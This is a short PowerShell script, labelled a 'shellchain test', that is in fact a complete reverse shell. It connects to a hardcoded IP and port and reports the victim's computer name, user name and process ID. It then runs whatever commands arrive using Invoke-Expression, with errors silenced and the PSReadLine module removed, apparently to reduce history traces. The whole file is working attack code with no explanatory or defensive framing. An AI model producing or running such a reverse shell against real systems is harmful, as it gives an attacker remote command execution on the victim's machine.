# Simplified shellchain test - no persistence, just shell
$targetIP = '192.168.0.100'
$targetPort = 4444

$ErrorActionPreference = 'SilentlyContinue'
Remove-Module PSReadLine -ErrorAction SilentlyContinue

$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($targetIP, $targetPort)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
$reader = New-Object System.IO.StreamReader($stream)

$writer.WriteLine("[+] SHELLCHAIN | $env:COMPUTERNAME\$env:USERNAME | PID: $PID")

while ($client.Connected) {
    if ($stream.DataAvailable) {
        $cmd = $reader.ReadLine()
        if ($cmd -and $cmd.Trim()) {
            $ct = $cmd.Trim().ToLower()
            if ($ct -eq 'exit') { break }
            try {
                $out = (Invoke-Expression $cmd 2>&1 | Out-String).TrimEnd()
                $writer.WriteLine($out)
            } catch {
                $writer.WriteLine("Error: $($_.Exception.Message)")
            }
        }
    }
    Start-Sleep -Milliseconds 50
}
$client.Close()
